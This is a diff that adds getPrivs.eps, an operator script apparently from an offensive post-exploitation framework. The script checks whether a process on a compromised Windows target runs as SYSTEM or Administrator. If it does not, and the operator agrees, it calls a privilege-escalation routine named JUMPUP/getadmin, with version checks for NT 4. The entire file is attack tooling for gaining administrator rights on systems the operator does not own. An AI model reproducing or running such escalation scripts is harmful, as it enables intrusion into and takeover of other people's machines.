@@ -1,0 +1,107 @@
+#####################################################################
+####  getPrivs.eps
+####  check for sufficient privileges and attempt JUMPUP if possible
+####  Created: 4/27/2007
+#####################################################################
+
+@record on;
+if (`whoami`){
+	string $sUser;
+	$sUser= GetCmdData("user");
+      `lpsetenv -option privleges -value "$sUser"`;
+	if ($sUser == "system") {
+		echo "";
+		echo "Ok, system...Moving on...";
+		echo "";
+		SetEnv("alreadyPriv", "true");
+		return true;
+	}
+}
+@record off;
+
+
+# Get our current privileges
+
+echo "Checking our current privileges...";
+@record on;
+
+string $sSys;
+string $sAdmin;
+
+echo "Get the targets name for administrator and system";
+
+if (`wellknownid -name administrators`){
+	$sAdmin = GetCmdData("sid");
+	echo "sadmin: $sAdmin";
+}
+
+if (`wellknownid -name system -local`){
+	$sSys = GetCmdData("sid");
+}
+
+echo "Let's see if we have enough rights to move on";
+
+if (`processcheck -user $sSys`) {
+	
+	echo "";
+	echo "You are system! Moving on...";
+	echo "";
+	SetEnv("alreadyPriv", "true");
+	return true;
+} else if (`processcheck -group $sAdmin`) {
+	
+	echo "";
+	echo "You have Administrator rights! Moving on...";
+	echo "";
+	SetEnv("alreadyPriv", "true");
+	return true;
+}
+@record off;
+
+#if we've gotten here, that means that we are not system or admin (should have returned by now)
+SetEnv("alreadyPriv", "false");
+
+echo "";
+echo "We're not the Admin or System...";	
+echo "";
+ifnot (prompt "Grant local Administrator rights to current process?") {
+	echo "I'm guessing you have a reason for not elevating";
+	return false;	
+}
+
+@record on;
+bool $doJump = true;
+
+
+	string $osMaj = GetEnv("OSMAJOR");
+	string $spMaj = GetEnv("SPMAJOR");						
+	int $major = <int>$osMaj;
+	int $spMajor = <int>$spMaj;
+#make sure we actually got data for the OS type.
+ifnot ($major == 0) {	
+	
+	if ($major == 4) {
+		bool $NTTermServ = GetCmdData("sysWTS");
+		#don't do jumpup if this is NT 4 < SP 3, or NT 4 Terminal Server.
+		if ($spMajor < 3) { $doJump = false; }
+		if ($NTTermServ) { $doJump = false; }
+	}
+}
+
+@record off;
+
+if ($doJump) {
+	ifnot (`getadmin`) {
+		echo "Failed to grant Administrator rights to your privilege.  Hope you know what you're doing!";
+		return false;
+	} else {
+		#if it gets here, then getadmin is running
+		return true;
+	}
+} else {
+	echo "This version of windows does not support JUMPUP (NT 4 < SP 3 or NT 4 Terminal Server)";
+	return false;
+}
+
+
+
